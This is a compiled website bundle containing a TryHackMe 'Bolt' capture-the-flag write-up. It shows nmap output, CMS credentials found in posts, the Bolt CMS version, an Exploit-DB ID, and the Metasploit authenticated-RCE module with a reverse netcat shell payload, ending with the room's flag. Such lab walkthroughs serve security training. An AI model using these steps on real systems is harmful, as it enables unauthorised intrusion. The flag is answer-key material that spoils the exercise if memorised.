"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7084],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>m});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),x=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},p=function(e){var t=x(e.components);return r.createElement(s.Provider,{value:t},e.children)},c="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),c=x(n),u=a,m=c["".concat(s,".").concat(u)]||c[u]||h[u]||o;return n?r.createElement(m,l(l({ref:t},p),{},{components:n})):r.createElement(m,l({ref:t},p))}));function m(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,l=new Array(o);l[0]=u;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i[c]="string"==typeof e?e:a,l[1]=i;for(var x=2;x<o;x++)l[x]=n[x];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},51333:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>l,default:()=>h,frontMatter:()=>o,metadata:()=>i,toc:()=>x});var r=n(87462),a=(n(67294),n(3905));const o={},l="Bolt",i={unversionedId:"Tryhackme/Bolt/Bolt",id:"Tryhackme/Bolt/Bolt",title:"Bolt",description:"A hero is unleashed",source:"@site/writeups/Tryhackme/Bolt/Bolt.md",sourceDirName:"Tryhackme/Bolt",slug:"/Tryhackme/Bolt/",permalink:"/writeups/Tryhackme/Bolt/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Boiler CTF",permalink:"/writeups/Tryhackme/Boiler CTF/"},next:{title:"Borderlands",permalink:"/writeups/Tryhackme/Borderlands/"}},s={},x=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Deploy the machine",id:"deploy-the-machine",level:2},{value:"Hack your way into the machine!",id:"hack-your-way-into-the-machine",level:2}],p={toc:x},c="wrapper";function h(e){let{components:t,...o}=e;return(0,a.kt)(c,(0,r.Z)({},p,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"bolt"},"Bolt"),(0,a.kt)("p",null,"A hero is unleashed"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/bolt"},"Bolt")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,a.kt)("li",{parentName:"ul"},"Using Metasploit"),(0,a.kt)("li",{parentName:"ul"},"Exploitation Bolt CMS 3.7.0")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"deploy-the-machine"},"Deploy the machine"),(0,a.kt)("p",null,"This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution. You should wait for at least 3-4 minutes for the machine to start properly."),(0,a.kt)("p",null,"If you have any queries or feedback you can reach me through the TryHackMe ",(0,a.kt)("a",{parentName:"p",href:"https://discord.gg/F7ERYzz"},"Discord server")," or through ",(0,a.kt)("a",{parentName:"p",href:"https://twitter.com/0x9747/"},"Twitter"),"."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Start the machine")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("h2",{id:"hack-your-way-into-the-machine"},"Hack your way into the machine!"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"A hero is unleashed")),(0,a.kt)("p",null,"Once you have successfully deployed the VM , enumerate it before finding the flag in the machine."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What port number has a web server with a CMS running?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 16:06 CEST\nNmap scan report for 10.10.174.31\nHost is up (0.041s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)\n|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)\n|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n8000/tcp open  http    (PHP 7.2.32-1)\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.0 404 Not Found\n|     Date: Tue, 29 Sep 2020 14:06:37 GMT\n|     Connection: close\n|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1\n|     Cache-Control: private, must-revalidate\n|     Date: Tue, 29 Sep 2020 14:06:37 GMT\n|     Content-Type: text/html; charset=UTF-8\n|     pragma: no-cache\n|     expires: -1\n|     X-Debug-Token: 53e7a3\n|     <!doctype html>\n|     <html lang="en">\n|     <head>\n|     <meta charset="utf-8">\n|     <meta name="viewport" content="width=device-width, initial-scale=1.0">\n|     <title>Bolt | A hero is unleashed</title>\n|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">\n|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">\n|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">\n|     <meta name="generator" content="Bolt">\n|     </head>\n|     <body>\n|     href="#main-content" class="vis\n|   GetRequest:\n|     HTTP/1.0 200 OK\n|     Date: Tue, 29 Sep 2020 14:06:37 GMT\n|     Connection: close\n|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1\n|     Cache-Control: public, s-maxage=600\n|     Date: Tue, 29 Sep 2020 14:06:37 GMT\n|     Content-Type: text/html; charset=UTF-8\n|     X-Debug-Token: 373a0e\n|     <!doctype html>\n|     <html lang="en-GB">\n|     <head>\n|     <meta charset="utf-8">\n|     <meta name="viewport" content="width=device-width, initial-scale=1.0">\n|     <title>Bolt | A hero is unleashed</title>\n|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">\n|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">\n|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">\n|     <meta name="generator" content="Bolt">\n|     <link rel="canonical" href="http://0.0.0.0:8000/">\n|     </head>\n|_    <body class="front">\n|_http-generator: Bolt\n|_http-title: Bolt | A hero is unleashed\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8000-TCP:V=7.80%I=7%D=9/29%Time=5F733F6C%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,29E1,"HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Tue,\\x2029\\x20Sep\\x20\nSF:2020\\x2014:06:37\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20PHP\nSF:/7\\.2\\.32-1\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x20pu\nSF:blic,\\x20s-maxage=600\\r\\nDate:\\x20Tue,\\x2029\\x20Sep\\x202020\\x2014:06:37\nSF:\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nX-Debug-Toke\nSF:n:\\x20373a0e\\r\\n\\r\\n<!doctype\\x20html>\\n<html\\x20lang=\\"en-GB\\">\\n\\x20\\\nSF:x20\\x20\\x20<head>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<meta\\x20charset=\\"u\nSF:tf-8\\">\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<meta\\x20name=\\"viewport\\"\\x20\nSF:content=\\"width=device-width,\\x20initial-scale=1\\.0\\">\\n\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<title>Bolt\\x20\\|\\x20A\nSF:\\x20hero\\x20is\\x20unleashed</title>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<l\nSF:ink\\x20href=\\"https://fonts\\.googleapis\\.com/css\\?family=Bitter\\|Roboto\nSF::400,400i,700\\"\\x20rel=\\"stylesheet\\">\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/theme/base-2018/css/bulma\\.css\\\nSF:?8ca0842ebb\\">\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<link\\x20rel=\\"styleshe\nSF:et\\"\\x20href=\\"/theme/base-2018/css/theme\\.css\\?6cb66bfe9f\\">\\n\\x20\\x20\nSF:\\x20\\x20\\t<meta\\x20name=\\"generator\\"\\x20content=\\"Bolt\\">\\n\\x20\\x20\\x2\nSF:0\\x20\\t<link\\x20rel=\\"canonical\\"\\x20href=\\"http://0\\.0\\.0\\.0:8000/\\">\\\nSF:n\\x20\\x20\\x20\\x20</head>\\n\\x20\\x20\\x20\\x20<body\\x20class=\\"front\\">\\n\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<a\\x20")%r(FourOhFourRequest,16C3,"HTTP/1\nSF:\\.0\\x20404\\x20Not\\x20Found\\r\\nDate:\\x20Tue,\\x2029\\x20Sep\\x202020\\x2014:\nSF:06:37\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20PHP/7\\.2\\.32-1\nSF:\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x20private,\\x20m\nSF:ust-revalidate\\r\\nDate:\\x20Tue,\\x2029\\x20Sep\\x202020\\x2014:06:37\\x20GMT\nSF:\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\npragma:\\x20no-cache\nSF:\\r\\nexpires:\\x20-1\\r\\nX-Debug-Token:\\x2053e7a3\\r\\n\\r\\n<!doctype\\x20html\nSF:>\\n<html\\x20lang=\\"en\\">\\n\\x20\\x20\\x20\\x20<head>\\n\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20<meta\\x20charset=\\"utf-8\\">\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0<meta\\x20name=\\"viewport\\"\\x20content=\\"width=device-width,\\x20initial\nSF:-scale=1\\.0\\">\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20<title>Bolt\\x20\\|\\x20A\\x20hero\\x20is\\x20unleashed</title>\\n\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20<link\\x20href=\\"https://fonts\\.googleapis\\\nSF:.com/css\\?family=Bitter\\|Roboto:400,400i,700\\"\\x20rel=\\"stylesheet\\">\\n\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/\nSF:theme/base-2018/css/bulma\\.css\\?8ca0842ebb\\">\\n\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/theme/base-2018/css/them\nSF:e\\.css\\?6cb66bfe9f\\">\\n\\x20\\x20\\x20\\x20\\t<meta\\x20name=\\"generator\\"\\x2\nSF:0content=\\"Bolt\\">\\n\\x20\\x20\\x20\\x20</head>\\n\\x20\\x20\\x20\\x20<body>\\n\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<a\\x20href=\\"#main-content\\"\\x20class=\\"v\nSF:is");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 29.29 seconds\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"8000")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the username we can find in the CMS?")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.174.31:8000/entry/message-from-admin"},"http://10.10.174.31:8000/entry/message-from-admin")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(87168).Z,width:"876",height:"186"})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Bolt")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the password we can find for the username?")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.174.31:8000/entry/message-for-it-department"},"http://10.10.174.31:8000/entry/message-for-it-department")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(52457).Z,width:"838",height:"461"})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"boltadmin123")),(0,a.kt)("ol",{start:4},(0,a.kt)("li",{parentName:"ol"},"What version of the CMS is installed on the server? (Ex: Name 1.1.1)")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.174.31:8000/bolt/login"},"http://10.10.174.31:8000/bolt/login")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(85358).Z,width:"369",height:"813"})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Bolt 3.7.1")),(0,a.kt)("ol",{start:5},(0,a.kt)("li",{parentName:"ol"},"There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/48296"},"https://www.exploit-db.com/exploits/48296")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"48296")),(0,a.kt)("ol",{start:6},(0,a.kt)("li",{parentName:"ol"},"Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....) Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run ",(0,a.kt)("inlineCode",{parentName:"li"},"apt update")," then ",(0,a.kt)("inlineCode",{parentName:"li"},"apt install metasploit-framework"))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"sudo msfconsole\nmsf5 > use unix/webapp/bolt_authenticated_rce\n[*] Using configured payload cmd/unix/reverse_netcat\nmsf5 exploit(unix/webapp/bolt_authenticated_rce) >\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"exploit/unix/webapp/bolt_authenticated_rce")),(0,a.kt)("ol",{start:7},(0,a.kt)("li",{parentName:"ol"},"Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Look for flag.txt inside the machine.")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"cd /home\nls\nbolt\ncomposer-setup.php\nflag.txt\ncat flag.txt\nTHM{wh0_d035nt_l0ve5_b0l7_r1gh7?}\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}")))}h.isMDXComponent=!0},52457:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-09-29_16-10-76993a8cad96016658d65f08439d729e.png"},87168:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-09-29_16-20-25f8cf23f197a18c91d98a1ef4cd45fe.png"},85358:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-09-29_16-26-1d48354e5e4e5cff4b97e1c22adc3001.png"}}]);